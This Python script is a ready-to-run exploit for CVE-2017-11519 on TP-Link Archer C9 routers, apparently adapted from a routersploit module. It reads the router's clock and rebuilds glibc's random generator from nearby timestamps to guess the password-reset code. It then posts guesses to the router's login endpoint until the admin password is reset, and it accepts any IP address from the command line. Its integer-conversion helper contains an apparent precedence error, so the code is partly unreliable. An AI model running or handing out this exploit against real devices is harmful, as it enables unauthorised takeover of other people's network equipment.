target = ""
# rsf exploit module
# description: TP-Link Archer C9 Admin Password Reset (CVE-2017-11519)
import math
import requests
import email.utils as eu

class Exploit:
    def __init__(self):
        self.target = ""
        self.port = 80
        self.RAND_MAX = 0x7fffffff

    def http_request(self, method, path, data=None):
        url = f"http://{self.target}:{self.port}{path}"
        try:
            if method == "POST":
                response = requests.post(url, data=data, timeout=10)
            else:
                response = requests.get(url, timeout=10)
            return response
        except:
            return None

    def get_time(self):
        print("[*] Getting current time at the target")
        response = self.http_request("GET", "/")
        if response is None or response.status_code != 200 or "Date" not in response.headers:
            raise Exception("Failed to get time")
        date = response.headers["Date"]
        return eu.mktime_tz(eu.parsedate_tz(date))

    def gen_reset_code(self):
        print("[*] Generating reset code at the target")
        response = self.http_request("POST", "/cgi-bin/luci/;stok=/login?form=vercode", 
                                   data={"operation": "read"})
        if response is None or response.status_code != 200:
            raise Exception("Failed to generate reset code")

    def try_reset_code(self, seed):
        code = self.get_random(seed, 100000, 999999)
        print(f"[*] Trying code {code} (seed {seed})")
        response = self.http_request("POST", "/cgi-bin/luci/;stok=/login?form=vercode",
                                   data={"operation": "write", "vercode": code})
        if response is None or response.status_code != 200:
            raise Exception("Failed to try reset code")
        return response.json()["success"]

    def glibc_prng(self, seed):
        def int32(x):
            return x & 0xffffffff - 0x100000000 if x & 0xffffffff > 0x7fffffff else x & 0xffffffff

        r = [0] * 344
        r[0] = seed
        for i in range(1, 31):
            r[i] = int32((16807 * r[i - 1]) % 0x7fffffff)
            if r[i] < 0:
                r[i] = int32(r[i] + 0x7fffffff)
        for i in range(31, 34):
            r[i] = int32(r[i - 31])
        for i in range(34, 344):
            r[i] = int32(r[i - 31] + r[i - 3])
        i = 344 - 1
        while True:
            i += 1
            r.append(int32(r[i - 31] + r[i - 3]))
            yield int32((r[i] & 0xffffffff) >> 1)

    def get_random(self, seed, t, u):
        prng = self.glibc_prng(seed)
        r = float(next(prng)) % self.RAND_MAX / self.RAND_MAX
        return int(math.floor(r * (u - t + 1)) + t)

    def guess_reset_code(self, time):
        print("[*] Guessing reset code")
        for seed in range(time, time + 5):
            if self.try_reset_code(seed):
                print("[+] admin's password has been reset!")
                return
        print("[-] Could not guess the reset code")

    def _check(self):
        try:
            self.time = self.get_time()
            self.gen_reset_code()
            return True
        except:
            return False

    def run(self):
        if self._check():
            self.guess_reset_code(self.time)
        else:
            print("[-] Device seems to be not vulnerable")



import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
